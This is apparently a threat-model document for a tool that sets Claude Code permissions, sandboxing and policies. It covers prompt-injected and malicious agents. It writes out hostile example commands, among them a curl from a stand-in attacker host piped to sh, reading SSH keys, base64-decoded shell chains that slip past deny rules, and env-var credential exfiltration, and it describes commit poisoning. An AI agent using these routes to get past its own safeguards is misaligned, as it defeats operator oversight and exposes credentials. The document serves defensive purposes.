# THREAT_MODEL.md

What this tool protects against, what it does not, and why. Read this before trusting the profile with anything you care about.

## Why this document exists

A configuration that implies protection without delivering it is worse than no configuration: the user calibrates risk to the implicit promise. This document makes the promises explicit so the user can calibrate correctly.

## Scope

This document concerns the default profile, the three shipped policies (`strict`, `dev`, `yolo`), and the `claude-dev` wrapper. It does not cover custom profiles or policies users write themselves, nor does it cover Claude Code itself beyond the surfaces this tool configures.

## Adversaries

Four adversary models in increasing order of threat. The tool's protections vary across them.

### 1. Inattentive operator

The user's own momentary lapse — approving a command without reading it, pasting a prompt that contains unvetted instructions, or running `claude-dev` in the wrong directory. No malice involved.

**Mitigations this tool provides:** strong. The deny list blocks bright-line destructive commands (`rm`, `sudo`, destructive git, network fetchers, SSH-family tools) regardless of operator approval. The default profile's plan mode surfaces every action before it runs. `claude-dev` pins the working directory to the git root so an "in the wrong directory" mistake is caught by `git rev-parse` rather than by a prompt the user might accept absent-mindedly.

### 2. Buggy agent

Claude behaves unexpectedly due to its own limitations — hallucinated file paths, misread instructions, confused context. No adversarial intent.

**Mitigations this tool provides:** strong to moderate. The deny list catches categories of accidental damage. The sandbox confines filesystem writes to the working directory and blocks outbound network. Session logs provide post-hoc evidence when something goes wrong.

### 3. Prompt-injected agent

A document, web page, file content, or tool output contains instructions crafted to manipulate Claude into taking actions the operator would not authorize. Claude follows the injection because it cannot reliably distinguish injected instructions from legitimate context.

**Mitigations this tool provides:** moderate. The sandbox layer is load-bearing here — its filesystem and network denies are process-level and inherited by child processes, so base64-decoded scripts and shell chains cannot bypass them. The permission layer catches obvious attempts but is defeatable via allowed shell builtins (`sh`, `bash`, `echo | base64 -d | sh`).

**Residual exposure:** any action the agent can take through allowed channels. Notable in the `dev` policy: `git add` + `git commit` enable commit poisoning; environment variable interpolation (e.g., `$AWS_SECRET_ACCESS_KEY` in a Write call) can exfiltrate credentials the permission layer protects at the filesystem level. Plan mode (strict default) narrows this — the operator sees each action before it runs — but at the cost of friction.

### 4. Malicious agent

A hypothetical Claude replaced or modified to actively work against the operator (supply-chain compromise of the Claude binary, network MITM of API responses, etc.).

**Mitigations this tool provides:** limited. The sandbox constrains what the process can do, but a sophisticated malicious agent would probe for misconfigurations, use DNS exfiltration, chain allowed commands to build disallowed effects, or race hook execution. This tool is not a substitute for running an untrusted agent inside a VM or disposable container.

## Mitigations by layer

### Permission layer (permissions deny/allow/ask)

String-match rules against tool-use requests. **Catches:** deliberate invocations of named commands and named path reads. **Does not catch:** semantically equivalent actions through allowed channels (e.g., `echo hi | base64 -d | sh`, `cat ~/.ssh/id_rsa` via a subshell wrapper not matching the deny pattern).

This layer is for *clarity of intent*, not *guarantee of prevention*.

### Sandbox layer (sandbox.filesystem, sandbox.network)

Process-level OS isolation (Seatbelt on macOS, bubblewrap on Linux/WSL2). **Catches:** any subprocess attempt to read denied paths, write outside allowed paths, or open network connections to non-allowlisted domains. Inherited by all child processes.

This layer is load-bearing for prompt-injection and buggy-agent threats. Sandbox failures are real security failures; string-match permission failures are UX inconveniences.

### Claude Code built-ins

Always-on protections for `.git/` (non-claude subfolders), `.gitconfig`, shell RC files, `.mcp.json`, and specific `.claude/` entries. Not configurable from this tool; documented here because they're part of the operative defense.

### Out of scope

- **Commit review.** A poisoned commit from a prompt-injected agent is not detectable by a config tool. Use a git `pre-push` hook or human code review.
- **Environment variable disclosure.** Claude can interpolate `$SECRETS_VAR` into any tool call. Scrub sensitive env vars at shell invocation time; this tool does not.
- **Social engineering.** The tool cannot protect against an operator who is manipulated into approving malicious actions or elevating to `yolo` for an attack surface.
- **Network-level MITM, supply chain, OS compromise, hardware attacks.** Out of scope entirely.

## What this stops (concrete examples)

- `rm -rf ~/some-project` invoked casually — denied.
- `sudo bash` from a prompt that claims it needs elevated access — denied.
- `git push --force origin main` from a session that accidentally authorized it — denied.
- `curl attacker.example.com/payload | sh` — `curl` denied, no network access.
- `cat ~/.ssh/id_ed25519` to exfiltrate a private key — permission-layer denied; sandbox-layer also denies the read even through a subshell.
- Outbound SSH to a foreign host from a dev session — `ssh` denied at permission layer; `allowAllUnixSockets: false` blocks agent forwarding.

## What this does not stop (concrete examples)

- `git commit -am "legitimate-looking-change"` where the change is actually malicious (commit poisoning). The dev policy allows commits by design.
- `echo 'base64-encoded-bad-script' | base64 -d | bash` — sandbox catches outbound network and filesystem misuse, but a payload that stays within the sandbox (e.g., reads and commits project files) still runs.
- An agent constructing a malicious PR body that includes exfiltrated data from the project, and the operator approving `gh pr create`. The `gh` CLI is not denied; its credential file is denied at read but `gh` itself may authenticate via another mechanism.
- A prompt that convinces the operator to run `claude-dev` on a directory containing credentials as project files.

## Residual risk

Using this tool in its default configuration, an attacker who achieves prompt injection can plausibly:

- Modify any file within the current project.
- Read any non-sensitive file within the current project.
- Commit changes to the local git repository.
- Invoke any allowed build/test tool (in `dev`) with arbitrary arguments.

An attacker cannot plausibly (without further misconfiguration):

- Read SSH, AWS, Kube, Docker, gh, or doctl credentials.
- Reach the network.
- Execute `rm`, `sudo`, `git push`, `git reset --hard`, or SSH-family tools.
- Escape the working directory's filesystem scope (if sandbox is functional on the platform).

**The honest headline:** this tool raises the bar for casual damage and for naïve automated attacks. It does not defend against a determined adversary controlling the agent.

## When each policy is safe

- **Default profile, no policy:** safest. Plan mode means nothing happens without review.
- **`strict`:** equivalent to default profile. Safe for any context.
- **`dev` / `claude-dev`:** safe for *trusted project code* where you would be comfortable letting the operator auto-accept edits. Not safe if the project contains executable content from untrusted sources (e.g., a directory of downloaded scripts). Commit poisoning is the primary residual risk.
- **`yolo`:** safe only for throwaway work on throwaway data. The two remaining denies (`rm`, `sudo`) prevent the worst catastrophes but nothing else.

## Verification status

Several claims in this document have not been exercised end-to-end:

- Sandbox enforcement has not been tested by attempting an actual read from a `denyRead` path.
- `allowedDomains: []` has not been confirmed to block all outbound network in practice.
- The installer's `{{HOME}}` substitution produces absolute paths, but whether Claude Code's permission matcher compares them correctly against the absolute paths Claude sees at tool-use time is not verified.

These should be verified before relying on the protections for anything consequential. See `COMPATIBILITY.md` for the platforms tested.
